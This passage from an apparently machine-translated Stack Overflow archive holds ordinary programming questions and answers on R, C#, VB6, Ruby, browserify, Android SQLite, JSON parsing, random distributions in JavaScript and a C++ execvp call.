      lead_count=length(affiliate_id),
      good_count= sum(good),
      bad_count = sum(bad),
      good_rate = sum(good)/length(affiliate_id),
      bad_rate = sum(bad)/length(affiliate_id))

 affiliate_id affiliate_account_id lead_count good_count bad_count good_rate  bad_rate
1         1006                   69          3          2         1 0.6666667 0.3333333
2         1006                   70          3          2         1 0.6666667 0.3333333 
```

哪里`dat`是：（我稍微修改你的输入以获得2个不同的组，因为你只给一个）

```
 id affiliate_id affiliate_account_id source         Pipeline num  good   bad
1 61046463         1006                   69 29eada Contact Info Bad   1 FALSE  TRUE
2 61046770         1006                   69 344f39    Did not Reach   1  TRUE FALSE
3 61053937         1006                   69 fff384               na   1  TRUE FALSE
4 61053941         1006                   70 22d8b6          App Out   1  TRUE FALSE
5 61060137         1006                   70 29eada         No Offer   1  TRUE FALSE
6 61060221         1006                   70 3fdb4f Contact Info Bad   1 FALSE  TRUE 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T18:16:08.773

```
ddd$good_count<-with(ddd,ifelse(good=="TRUE",1,0))

ddd$bad_count<-with(ddd,ifelse(bad=="TRUE",1,0))

ddply(ddd, .(affiliate_id, affiliate_account_id), summarise, lead_count=length(affiliate_id), good_count=sum(good_count), bad_count=sum(bad_count),good_rate = sum(good_count)/length(affiliate_id),
  bad_rate = sum(bad_count)/length(affiliate_id)) 
```

# c# - 使用 StreamReader 在文件中查找正则表达式并使用 StreamWriter 覆盖它

> ID：16110724
> 
> 赞同：0
> 
> 时间：2013-04-19T17:55:35.240
> 
> 标签：c#, regex, streamreader, streamwriter

我正在使用 StreamReader 读取文本文件并执行 Regex.Match 以查找特定信息，现在当我找到它时，我想用 Regex.Replace 替换它，并且我想将此替换写回文件。

这是我文件中的文本：

```
/// 
/// <Command Name="Press_Button"  Comment="Press button" Security="Security1">
/// 
/// <Command Name="Create_Button"  Comment="Create button" Security="Security3">
/// ... lots of other Commands 
```

现在我需要在 Create_Button 命令中找到： Security="Security3"> ，将其更改为 Security="Security2"> 并将其写回文件

```
do { 
    // read line by line 
    string ReadLine = InfoStreamReader.ReadLine();

    if (ReadLine.Contains("<Command Name"))
     {
         // now I need to find Security1, replace it with Security2 and write back to the file
     }
   }
while (!InfoStreamReader.EndOfStream); 
```

欢迎任何想法......

**已编辑：** 良好的调用来自 tnw 逐行读取和写入文件。需要一个例子。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:01:08.133

我会做更多这样的事情。您不能像您在那里描述的那样直接写入文件中的一行。

这不使用正则表达式，但完成了同样的事情。

```
var fileContents = System.IO.File.ReadAllText(@"<File Path>");

fileContents = fileContents.Replace("Security1", "Security2"); 

System.IO.File.WriteAllText(@"<File Path>", fileContents); 
```

几乎直接从这里拉出来：[c#replace string within file](https://stackoverflow.com/questions/4339817/c-sharp-replace-string-within-file)

或者，您可以循环并逐行读取文件并将其逐行写入新文件。对于每一行，您可以检查`Security1`、替换它，*然后*将其写入新文件。

例如：

```
StringBuilder newFile = new StringBuilder();

string temp = "";

string[] file = File.ReadAllLines(@"<File Path>");

foreach (string line in file)
{
    if (line.Contains("Security1"))
    {

    temp = line.Replace("Security1", "Security2");

    newFile.Append(temp + "\r\n");

    continue;

    }

newFile.Append(line + "\r\n");

}

File.WriteAllText(@"<File Path>", newFile.ToString()); 
```

来源：[如何使用 c# 从文本文件中编辑一行](http://social.msdn.microsoft.com/Forums/en-US/Vsexpressvcs/thread/27a98772-2dc6-4197-9f75-6cc119d4a88a/)

# vb6 - 如何构造一个包含多个 Recordset 的 Recordset 对象？

> ID：16110728
> 
> 赞同：1
> 
> 时间：2013-04-19T17:55:38.343
> 
> 标签：vb6

我正在尝试构建一个包含多个 Recordset 的 Recordset 对象。我正在尝试使用 .NextRecordset 方法来执行此操作，但我遇到了麻烦。具体来说，我`Current provider does not support returning multiple recordsets from a single execution.`在执行`.NextRecordset`方法时遇到错误。

```
Dim oRs As ADODB.Recordset
Set oRs = New ADODB.Recordset
oRs.CursorLocation = adUseClient

oRs.Fields.Append "hello1", adVarChar, 100, adFldUpdatable
oRs.Fields.Append "hello2", adVarChar, 100, adFldUpdatable

oRs.Open , , adOpenStatic, adLockOptimistic
oRs.AddNew
oRs.Fields("hello1") = "234"
oRs.Fields("hello2") = "234"

Set oRs = oRs.NextRecordset       ' BLOWS UP
'  Add some columns + rows to this recordset 
```

额外的复杂性是我需要在 C# 中执行此操作（通过 Interop），但我很乐意首先在 VB6 中解决它。

那么，有没有可能做我想做的事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T10:59:26.907

我认为最接近您想要的东西是ADO中的*分层记录集。*这些可以深入多个级别，或者只是两个级别（一个记录集连续章节字段），如您的请求：

> 无论父 Recordset 以何种方式形成，它都将包含一个章节列，用于将其与子 Recordset 相关联。如果您愿意，父 Recordset 还可能具有包含子行上的聚合（SUM、MIN、MAX 等）的列。父记录集和子记录集都可能具有包含记录集中行上的表达式的列，以及新的且最初为空的列。
> 
> 您可以将分层 Recordset 对象嵌套到任何深度（即，创建子 Recordset 对象的子 Recordset 对象，等等）。
> 
> 您可以通过编程方式或通过适当的可视控件访问成形 Recordset 的 Recordset 组件。

这样做的关键是使用 Data Shaping Service，这是一个 OLEDB 提供程序，它“骑在”您的基础提供程序之上（即使在使用客户端游标时仅*隐含本地游标服务提供程序）。*

[在How To Create Hierarchical Recordsets Programmatically](http://support.microsoft.com/kb/196029) Support 一文中可以找到一些描述和粗略的示例。

更多详细信息和参考资料可以在[Data Shaping](http://msdn.microsoft.com/en-us/library/windows/desktop/ms676186%28v=vs.85%29.aspx)中找到，包括用于定义 Shape 命令的类似 SQL 的语言。

* * *

或者您是在询问*分页*记录集，例如在[PageSize 属性 (ADO)](http://msdn.microsoft.com/en-us/library/windows/desktop/ms681431%28v=vs.85%29.aspx)中？

# svn - Advantages & Disadvantages Object Storage vs File Storage for a Subversion repository?

> ID：16110735
> 
> 赞同：2
> 
> 时间：2013-04-19T17:55:52.423
> 
> 标签：svn, object, storage

I'm new to Subversion and Object Storage concepts. I'm trying to understand whether storing a Subversion repository on an Object Storage solution is possible and also whether it would be advantageous to do so (as opposed to using traditional File Storage)? Possibly having application servers using NFS to access the Subversion repository share with the repository files located on Object Storage.

Thanks in advance,

Jim

# ruby - Ruby 中的 end.method 有什么作用？

> ID：16110737
> 
> 赞同：7
> 
> 时间：2013-04-19T17:55:54.327
> 
> 标签：ruby, syntax

我见过这样的代码：

```
def some_method
  # ...
end.another_method 
```

零件有什么`end.another_method`作用？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-19T18:04:28.087

我相信您的示例是错误的，因为您在这里所做的是定义一个方法并在方法定义的结果（不是方法调用）上调用一个方法，这总是（通常？）`nil`。

fmendez 指的是类似的形式，但`end`在这种情况下是块的结尾，而不是方法定义。

因此，例如：

```
array.map do |element|
  element * element
end.sum 
```

假设会返回给定数组元素的平方和。

但是，如果您正在执行这样的方法链接，则更常见的是使用括号样式块而不是`do..end`，因此上面的示例将显示为：

```
array.map{ |element|
  element * element
}.sum 
```

Ruby 中的块是方法参数，与任何其他方法参数（除了专用语法）不同，因此将点放在后面与将点放在后面没有`end`什么不同`)`

```
'hello'.concat(' world!').capitalize 
```

这也是方法链的一个例子。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-19T18:18:32.223

在 Ruby 中，`.`是*消息发送操作符*。（在其他语言中，它会被称为*方法调用运算符*。）所以，当你说

```
foo.bar 
```

它的意思是“评估`foo`并将消息发送`bar`到评估的结果`foo`”。

在这种特殊情况下，您将消息发送`another_method`到评估结果

```
def some_method; end 
```

Ruby 语言规范说方法定义表达式的值是未定义的，应该被忽略；并且在大多数 Ruby 实现中，方法定义表达式只是简单地计算为`nil`，这并不是非常有用。

但是，在某些实现中，方法定义表达式的计算结果*确实*比`nil`. 例如，在 Rubinius 上，它们对`CompiledMethod`正在定义的方法的对象求值。并且`CompiledMethod`具有丰富的 API，因此向`CompiledMethod`对象发送消息绝对是有意义的。

也有人建议方法定义表达式应该返回一个`Symbol`对应于被定义的方法的名称或一个`Method`对象。

简单地说：在这种特殊情况下，点的含义与它在 Ruby 中的含义完全相同：发送消息、调用方法、调用成员函数，无论您想调用什么。

# java - Ajax 文件上传存储字节直到保存 java。

> ID：16110740
> 
> 赞同：1
> 
> 时间：2013-04-19T17:56:03.653
> 
> 标签：java, jquery, file-upload

我是使用 Tapestry5 的 Java 开发人员。我正在使用 jQuery 插件通过 ajax 管理我的文件上传。

我正在寻找临时保存附件的最佳方法，直到实际页面被保存。我当前的工作流程包括用户使用 ajax 上传框或位于文件旁边的 ajax 删除链接（如 gmail 附件）上传/删除文件。在文件上传并单击表单中的保存操作之前，我不想将文件提交到数据库。

我目前正在上传文件并将它们保存到用户会话，直到单击表单中的保存操作。如果只使用一个选项卡，这非常有效，但我不确定这是最好的方法。

有没有人有任何额外的建议？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:00:54.820

我不得不做一些类似的事情，但是堆栈略有不同（ASP.NET MVC）。

我解决问题的方法是在页面加载时生成一个 GUID 并将其填充到隐藏的输入中。您的数据存储可以是您想要的任何内容（会话、数据库、磁盘等 - 只需确保将 GUID 作为密钥的一部分）。当用户保存表单时，请确保包含您隐藏的输入数据，然后您将有一种独特的方式来识别属于该实例的文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:01:57.733

到目前为止，您所做的似乎是正确的，如果用户尝试在多个选项卡中使用您的 Web 应用程序，您可能会遇到麻烦。你可以做的是：

1.  在使用 ajax 调用上传任何文件之前获取唯一密钥。（注意：正如用户@Ek0nomik 所建议的，这也可以在生成页面时包含在隐藏的输入属性中）
2.  每当上传文件时，请确保也提交此密钥。
3.  保存表单后，提交密钥，然后您就知道应该在数据库中提交哪些文件。

# javascript - "Flip View" of ListViews for Windows8

> ID：16110744
> 
> 赞同：0
> 
> 时间：2013-04-19T17:56:17.960
> 
> 标签：javascript, html, listview, windows-8

I would like to create a "FlipView" of ListViews in Windows8 using JS and HTML. That is, I would like a control that would display a ListView and when the user swips or scrolls, it would display the contents of a different ListView. Is this possible? If so, how? Thanks for helping a Windows8 noob!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T06:14:17.580

我尝试将列表视图放在翻转视图下，但没有成功。两个控件使用的 CSS 类重叠（例如 win-item）。我发现嵌套列表视图中的项目像翻转视图项目一样占据了整个可用空间。发生这种行为是因为托管嵌套列表视图项的 win-container 的大小是这样的。即使在 css 文件中覆盖它之后，我也无法将其（win-container）大小显式设置为更小。

看起来该列表视图不会嵌套在 css/html 的翻转视图下。如果其他人在这方面取得了成功，请分享您的评论和代码。

如果有人在 c# 中使用 FlipView 和嵌套的 GridView/ListView 尝试过并取得了成功，请用代码标记答案（知道会很有趣）。

# image - Overlap between Hadoop InputSplits?

> ID：16110747
> 
> 赞同：3
> 
> 时间：2013-04-19T17:56:21.503
> 
> 标签：image, image-processing, hadoop

I'm making a Hadoop job for doing convolutions on one or more potentially very large PGM files. Each mapper will process some number of rows from one of the files and the reducers will put the files back together again. However, each mapper needs a few rows above and below that that it's doing the convolution on. Usually this is not a problem since I have made a RecordReader to get this redundancy, but it presents an issue for the first and last lines of an InputSplit since I cannot access the rows from the last split.

Is there any way to make InputSplits overlap so that the last few lines of the first are the first few lines of the second?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:18:16.440

您可以编写自己的自定义拆分器。见史蒂文·刘易斯的[这篇文章](http://lordjoesoftware.blogspot.co.il/2010/08/customized-splitters-and-readers.html)

# android - on cascade delete in android Sqlite 3.7.11 not working

> ID：16110748
> 
> 赞同：1
> 
> 时间：2013-04-19T17:56:22.177
> 
> 标签：android, sqlite

I have 3 table in helper

1)Login_Table table for user information Storing 2)Service_Table for Storing services having one column references to Login_Table table 3)SubService_Table for Storing sub services having one column references to service_table and another Login_Table table

i want to delete row from particular service table then automatic delete record from the subservice row which reference to service table id table but when i delete particular row from service table it force to be close

`db.execSQL( " CREATE TABLE "+ LoginTable +" ( " +login_ID + " INTEGER PRIMARY KEY AUTOINCREMENT , " + NAME + " TEXT, " + USERNAME + " TEXT, " +PASSWORD + " TEXT," + GENDER + " TEXT, " + CONTACT + " TEXT, " + SQUE + " TEXT, " + ANSWER + " TEXT, " + EmailId + " TEXT, " + UType+" TEXT)");`

 `db.execSQL("CREATE TABLE "+Services+"("+Ser_ID+" INTEGER PRIMARY KEY AUTOINCREMENT, "+Ser_Name+" TEXT, "+Ser_UID+" Integer not null, FOREIGN KEY ("+Ser_UID+") REFERENCES "+LoginTable+" ("+login_ID+"));");` 

`db.execSQL("CREATE TABLE "+Sub_Services+"("+Sub_Ser_ID+" INTEGER PRIMARY KEY AUTOINCREMENT, "+Sub_Ser_Name+" TEXT, "+Ref_Ser_ID+" Integer not null, "+Sub_Ser_UID+" Integer not null, FOREIGN KEY ("+Ref_Ser_ID+") REFERENCES "+Services+" ("+Ser_ID+") ON DELETE CASCADE , FOREIGN KEY ("+Sub_Ser_UID+") REFERENCES "+LoginTable+" ("+login_ID+")) ;");`

i also used enable foreign key by following code

 `````
public void onOpen(SQLiteDatabase db) {
        super.onOpen(db);
        if (!db.isReadOnly()) {
        db.execSQL("PRAGMA foreign_keys=ON;");
        }
    } 
````  `How cascade delete exactly use in android SQLite?? i used android 4.2 and version of sqlite 3.7.11...``

# javascript - 如何使用 browserify 对 npm 模块执行转换

> ID：16110750
> 
> 赞同：18
> 
> 时间：2013-04-19T17:56:32.390
> 
> 标签：javascript, browserify

默认情况下，browserify 不对 node_modules 中包含的模块执行转换，即没有路径。

我制作了一个快速的 github 存储库，[在这里](https://github.com/andyperlitch/br-transform-nodemodules)进行了说明。浏览器化的`index.js`文件如下所示：

```
var fs = require('fs');
var testmodule = require('testmodule');
var trg1 = document.getElementById("target1");
var trg2 = document.getElementById("target2");
trg1.innerHTML = fs.readFileSync(__dirname+"/something.txt");
trg2.innerHTML = testmodule(); 
```

`testmodule`看起来像这样：

```
var fs = require('fs');
exports = module.exports = function() {
    return fs.readFileSync(__dirname+'/data.txt');
} 
```

使用`brfs`转换模块，我希望能够内联两个调用`fs.readFileSync`，但是当我运行时`browserify index.js -t brfs -o bundle.js`，只有我的主项目中的调用被内联。这是 bundle.js 结果：

```
;(function(e,t,n){function r(n,i){if(!t[n]){if(!e[n]){var s=typeof require=="function"&&require;if(!i&&s)return s(n,!0);throw new Error("Cannot find module '"+n+"'")}var o=t[n]={exports:{}};e[n][0](function(t){var i=e[n][1][t];return r(i?i:t)},o,o.exports)}return t[n].exports}for(var i=0;i<n.length;i++)r(n[i]);return r})({1:[function(require,module,exports){
// nothing to see here... no file methods for the browser

},{}],2:[function(require,module,exports){
var fs = require('fs');
var testmodule = require('testmodule');
var trg1 = document.getElementById("target1");
var trg2 = document.getElementById("target2");
trg1.innerHTML = "This is data from a file in the main project folder"; // TRANSFORMED
trg2.innerHTML = testmodule();
},{"fs":1,"testmodule":3}],3:[function(require,module,exports){
(function(__dirname){var fs = require('fs');
exports = module.exports = function() {
    return fs.readFileSync(__dirname+'/data.txt'); // NO TRANSFORM
}
})("/node_modules/testmodule")
},{"fs":1}]},{},[2])
; 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2013-04-19T21:20:39.553

从 substack（browserify 的作者）那里得到了一些帮助。要指定项目外部的模块是否需要转换，您需要`browserify.transform`在`package.json`. 因此对于我上面给出的示例，目录中的 package.json 文件`testmodule`如下所示：

```
{
    "name":"testmodule",
    "version":"0.0.0",
    "browserify": {
        "transform": ["brfs"]
    },
    "main": "index.js"
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-19T21:57:00.260

您也可以使用`browserify -g brfs`代替`browserify -t brfs`. `g`是一个全局变换（适用于依赖项）

# android - 为广播流媒体服务显示 ProgressDialog？

> ID：16110751
> 
> 赞同：2
> 
> 时间：2013-04-19T17:56:33.643
> 
> 标签：android, service, android-mediaplayer, audio-streaming

我制作了一个用于广播流媒体的应用程序，代码如下：

```
 public class streamService extends Service {

public static MediaPlayer stream;
public static String url;
public static int serviceAvailable;
private static final int HELLO_ID = 1;
public static NotificationManager mNotificationManager;
public static PowerManager.WakeLock wl;
public static Boolean bgPlay = false;
TelephonyManager tm;

ProgressDialog pDialog;

public static String Tag="";

@Override
public IBinder onBind(Intent arg0) {
    return null;
}

@Override
public void onCreate() {
    super.onCreate();
    pDialog=new ProgressDialog(RadioList.con);
    pDialog.setTitle("Please wait!!");
    pDialog.setMessage("Connecting");
    pDialog.setCancelable(false);
    pDialog.show();

}

public void onStart(Intent intent, int startid) {
    // Restore preferences

    Tag=RadioList.Tag;
    //RadioStationThree.pDialog.show();
    stream = new MediaPlayer();

    try {
        stream.setDataSource(RadioList.URL);
    } catch (IllegalArgumentException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();

    } catch (IllegalStateException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();

    } catch (IOException e1) {
        // TODO Auto-generated catch block
        e1.printStackTrace();

    }
    stream.setAudioStreamType(AudioManager.STREAM_MUSIC);

    stream.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {

        public void onPrepared(MediaPlayer stream) {

        /*  tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            tm.listen(mPhoneListener, PhoneStateListener.LISTEN_CALL_STATE);

            makeNotification();
        */  // Set the Wake Lock - CPU on, keyboard and screen off
            /*PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK,
                    getString(R.string.app_name));
            wl.acquire();*/
            serviceAvailable = 1;

            System.out.println("HERE CANCEL");
            pDialog.cancel();

            stream.start();

        }
    });
    try {
        stream.prepare();
    } catch (IllegalStateException e1) {
        e1.printStackTrace();

    } catch (IOException e1) {
        e1.printStackTrace();

    }
}

@Override
public void onDestroy() {
    // kill the stream
    serviceAvailable = 0;
    stream.stop();
    stream.release();
    stream = null;
    // kill the status notification
} 
```

此服务在单击活动中的按钮时启动但是当我单击按钮时，应用程序会停止工作一段时间，然后继续正常运行（有时还会显示 ANR）。我也使用了 ProgressDialog 但它也停止旋转并显示 ANR。对此可能的解决方案是什么？请帮忙？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T19:28:27.890

感谢“StinePike”在新线程中使用代码很简单，它工作得很好！

# javascript - 解析格式错误的 JSON 字符串

> ID：16110755
> 
> 赞同：8
> 
> 时间：2013-04-19T17:56:42.497
> 
> 标签：javascript, node.js

我收到来自第三方的格式错误的 JSON 字符串。我尝试使用`JSON.parse(str)`将其解析为 JavaScript 对象，但它当然失败了。

原因是键不是字符串：

```
{min: 100} 
```

与有效的 JSON 字符串相反（解析得很好）：

```
{"min": 100} 
```

我现在需要接受格式错误的字符串。我想忘记正确引用键是一个常见的错误。有没有一种好方法可以将其更改为有效的 JSON 字符串以便我可以解析它？现在我可能不得不逐个字符地解析并尝试形成一个对象，这听起来很糟糕。

想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T18:13:13.370

您可以只进行评估，但如果您不信任来源，那将是不好的安全做法。更好的解决方案是手动修改字符串以引用键或使用其他人为您编写的工具（查看daepark 编写的[https://github.com/daepark/JSOL ）。](https://github.com/daepark/JSOL)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T18:52:37.007

我最近才这样做，使用[Uglifyjs](https://github.com/mishoo/UglifyJS)评估：

```
var jsp = require("uglify-js").parser;
var pro = require("uglify-js").uglify;

var orig_code = "var myobject = " + badJSONobject;
var ast = jsp.parse(orig_code); // parse code and get the initial AST
var final_code = pro.gen_code(ast); // regenerate code

$('head').append('<script>' + final_code + '; console.log(JSON.stringify(myobject));</script>'); 
```

这在某种程度上确实很草率，并且与基于 eval() 的解决方案具有所有相同的问题，但是如果您只需要一次解析/重新格式化数据，那么上面应该为您提供 JS 对象的干净 JSON 副本.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T18:01:48.700

根据 JSON 中的其他内容，您可以简单地进行字符串替换和替换`'{'`with`'{"'`和`':'`with `'":'`。

# playframework - Playframework 1.x 静态方法如何以线程安全的方式工作

> ID：16110757
> 
> 赞同：1
> 
> 时间：2013-04-19T17:56:45.883
> 
> 标签：playframework, playframework-1.x

可能是一个愚蠢的问题，但我正在学习 Play framework 1.2.5。我注意到控制器操作都是静态方法，我假设每个请求都将在单独的线程中处理。如果是这样，Play 框架如何确保这些静态控制器方法是线程安全的？我认为，只要我们不在控制器方法之间共享任何东西，那么我们就很好（？），如果我错了，请纠正我。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T07:35:37.063

是的，我们很好。如您所知，HTTP 是**无状态**的，因此请求之间不会共享任何内容。Play`ThreadLocal`在处理请求时使用 s。每个请求都有自己的线程，因此您可以完全控制当前请求 - 响应生命周期。

如果你想在控制器之间共享数据，你有`session`object 但是它很小并且只接受`String`s. 对于其他数据类型或共享的不同实现，您应该使用一个`Cache`实现。有关详细信息，请参阅[会话](http://www.playframework.com/documentation/1.2.5/controllers#session)和[缓存](http://www.playframework.com/documentation/1.2.5/cache)文档。

祝你好运！

# javascript - 生成具有非均匀分布的随机数

> ID：16110758
> 
> 赞同：11
> 
> 时间：2013-04-19T17:56:47.577
> 
> 标签：javascript, random, distribution

Javascript`Math.random()`返回一个具有“均匀”分布的伪随机数。

我需要在 [0,1] 范围内生成一个向任一侧倾斜的随机数。（意思是，在 0 或 1 旁边获得更多数字的机会更高）

理想情况下，我希望有一个参数来设置这条曲线。

我想我可以做得到`Math.random^2`这样的结果，但是有什么更复杂的方法可以实现呢？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-04-20T12:20:21.247

我想你想要[beta 发行版`alpha=beta=0.5`](http://en.wikipedia.org/wiki/File:Beta_distribution_pdf.svg)

可以使用逆累积分布将均匀随机数转换为 beta 分布。

```
unif = Math.random() 
```

我不熟悉`javascript`，但这应该很清楚：

```
beta = sin(unif*pi/2)^2 
```

PS：您可以生成许多这样的数字并绘制直方图 ![在此处输入图像描述](https://i.stack.imgur.com/rk2z6.png)

**编辑：**

对于向 0 倾斜，将`beta`值转换为 -

```
beta_left = (beta < 0.5) ? 2*beta : 2*(1-beta); 
```

![在此处输入图像描述](https://i.stack.imgur.com/yDHlQ.png)

为了向 1 倾斜，变换为 -

```
beta_right = (beta > 0.5) ? 2*beta-1 : 2*(1-beta)-1; 
```

![在此处输入图像描述](https://i.stack.imgur.com/X5gO2.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-01-10T05:55:10.720

我只是想出了一种更简单的方法来让随机数偏向每一侧，并且没有任何依赖关系。

此方法使用两个 Javascript 的常规随机数。第一个与自身相乘（指数越大，偏斜效应越大），第二个选择要偏斜到分布的哪一侧。

```
function skewedRandom() {
    const a = Math.pow(Math.random(), 2);
    if (Math.random() < 0.5) {
        return a;
    }
    return 1 - a;
} 
```

在此代码中，指数设置为 2。来自 10,000 次执行的示例直方图，指数为 2，如上所示：

[![指数为 2 的直方图](https://i.stack.imgur.com/Dujmu.png)](https://i.stack.imgur.com/Dujmu.png)

使用指数 3：

[![指数为 3 的直方图](https://i.stack.imgur.com/erIZg.png)](https://i.stack.imgur.com/erIZg.png)

使用指数 10： [![指数为 10 的直方图](https://i.stack.imgur.com/kpnP4.png)](https://i.stack.imgur.com/kpnP4.png)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-19T18:14:02.790

我认为你需要重新考虑你的问题。Poisson 是一种以速率指定的计数分布，例如我在每个时间段内平均看到某事的发生次数。它产生正整数，因此结果不能仅在 [0,1] 范围内。你能澄清你想要什么吗？

无论如何，要生成具有速率 lambda 的泊松，一种算法是：

```
threshold = Math.exp(-lambda)
count = 0
product = 1.0
while (product *= rand) >= threshold {
      count += 1
}
return count 
```

其中“rand”是对 Uniform(0,1) 的函数调用。我不知道javascript，但这应该足够简单，您可以实现。

**回复编辑的问题：**

有几种分布会在有界范围内产生结果，但其中许多并不适合胆小的人，例如 Johnson 家族或 Beta 分布。

一个简单的方法是三角形分布。Sqrt(rand) 将给出一个朝向 1 的三角形分布，而 (1-Sqrt(1-rand)) 将给出一个朝向零的三角形分布。

可以生成一个更一般的三角形，其模式（最常见的值）为 m（其中 0 <= m <= 1）

```
if rand <= m
    return m * Sqrt(rand)
else
    return 1 - ((1 - m) * Sqrt(1 - rand)) 
```

请注意，rand 的每次调用都是一个单独的统一随机数，如果您为 rand 生成一个值并在整个过程中使用它，这将是不正确的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-04-19T18:29:05.843

Yoy 可以在可用的情况下使用[window.crypto.getRandomValues](https://developer.mozilla.org/en-US/docs/DOM/window.crypto.getRandomValues)

```
<div id="result"></div>

var randVal = new Uint8Array(1);

window.crypto.getRandomValues(randVal);

document.getElementById("result").textContent = randVal[0] / 255; 
```

在[jsfiddle 上](http://jsfiddle.net/Xotic750/KM2DC/)

（如果这是你的要求，我不确定）

或者也许像这样

```
<div id="result"></div>

function poissonRandomNumber(lambda) {
    var L = Math.exp(-lambda),
        k = 0,
        p = 1;

    do {
        k = k + 1;
        p = p * Math.random();
    } while (p > L);

    return k - 1;
}

document.getElementById("result").textContent = poissonRandomNumber(100); 
```

也在[jsfiddle上](http://jsfiddle.net/Xotic750/DXXhs/)

# javascript - 如何在翻转时显示选择下拉菜单？

> ID：16110770
> 
> 赞同：0
> 
> 时间：2013-04-19T17:57:34.980
> 
> 标签：javascript, jquery, html-select

是否可以使用 javascript/jquery 在选择翻转时显示下拉选项？我查看了[http://www.devcurry.com/2009/04/using-javascript-to-dropdown-html.html](http://www.devcurry.com/2009/04/using-javascript-to-dropdown-html.html)但演示似乎无法 100% 正常运行。

# javascript - Javascript（chrome开发工具）中对象属性的“泄漏”是什么？

> ID：16110773
> 
> 赞同：1
> 
> 时间：2013-04-19T17:57:42.877
> 
> 标签：javascript, properties, memory-leaks, google-chrome-devtools, heap-memory

我正在使用 chrome 开发工具和[谷歌的 3 种快照技术](https://docs.google.com/presentation/d/1wUVmf78gG-ra5aOxvTfYdiLkdGaR9OhXRnOlIcEmu2s/pub?start=false&loop=false&delayms=3000#slide=id.g31ec7af_0_58)调试我的 javascript 代码中的内存泄漏，我无法推荐这些技术。

但是，现在，通过在快照 3 的视图中查看在快照 1 和 2 之间分配的对象（如果您阅读幻灯片，这些是泄漏的对象），我看到了一大堆“对象属性”。

![对象属性泄漏](https://i.stack.imgur.com/hsdk3.png)

这是什么意思 ？

这是否意味着我在快照 1 中不存在且我没有删除的那些对象中添加了一些属性（在快照 2 和 3 之间）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T06:07:24.003

代码做了一些强制 V8 为 OctreeCell 创建对象属性项的操作。

在拍摄第一个快照之前进行一次热身迭代是有意义的，或者只是为第四个快照进行下一次迭代并查看快照 2 和 3 之间的对象。

# c++ - C++ 系统调用“SED”

> ID：16110775
> 
> 赞同：0
> 
> 时间：2013-04-19T17:57:49.420
> 
> 标签：c++, system-calls

我正在尝试使用 c++ 程序运行 sep 命令。当我编译下面的代码时，我收到一条警告，`argv[0]="sep";`说明`"deprecated conversion from string constant to âchar*â [-Wwrite-strings]."`当我运行下面的程序时，我得到 Exec Failed！每次从 execvp() 下面的行开始。

```
#include<iostream>
#include<string>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>

using namespace std;

int main(int argc, char **argv){
    pid_t pid;
    int fail;

    argv[0] = "sep";

    int i=0;
    while(i < argc){
        cout<< i << ": " << argv[i] <<endl;
        i++;
    }

    if(argc < 5){
        cout<< "./upload -i -r <key> <source> <destination>" <<endl;
    }else{
        pid = fork();
        if(pid < 0){
            cout<<"Fork Failed!\n";
            exit(1);
        }else if(pid == 0){                 //if you are in the child process
            fail = execvp("scp", argv); //execute command, return -1 on fail
            cout<< "Exec Failed!\n";
            exit(1);
        }else{
            int status;
            waitpid(pid, &status, 0);   //wait for each pid
        }
    }
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:49:05.730

哇……错别字。

其中 argv[0] = "sep";

应该是“scp”

```
 char** args;

    args = new char*[argc+2]; //forcing 2 flags
    args[0] = "scp";
    args[1] = "-i";
    args[2] = "-r";
    args[3] = argv[1]; //key
    args[4] = argv[2]; //source
    args[5] = argv[3]; //destination

    execvp(args[0], args); 
```

# python - SQLAlchemy 基于字典对约束建模

> ID：16110776
> 
> 赞同：2
> 
> 时间：2013-04-19T17:57:52.377
> 
> 标签：python, sqlalchemy

我有一张这样的桌子：

```
class Sample(Base):
    __tablename__ = 'sample'
    id = Column(Integer, primary_key=True)
    type = Column(Enum(u'Lion', u'Tiger', name='types'))
    color = Column(Enum(... a specific list based on type ...)) 
```

和一本字典：

```
colors = { 'Lion' : ['gold', 'orange'],
           'Tiger' : ['blackorange', 'whiteblue']
         } 
```

现在我想要一个约束，它允许我的样本中的颜色属性只能是对应列表中的一个项目。

这是解决这个问题的聪明方法？

（我发现的唯一方法是使用一种 setter 方法：[Using Descriptors and Hybrids](http://docs.sqlalchemy.org/en/rel_0_8/orm/mapper_config.html#using-descriptors-and-hybrids)）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T08:47:56.587

您可以使用事件侦听器：

```
colors = { 'Lion' : ['gold', 'orange'],
           'Tiger' : ['blackorange', 'whiteblue']
         }
class Sample(Base):
    __tablename__ = 'sample'
    id = Column(Integer, primary_key=True)
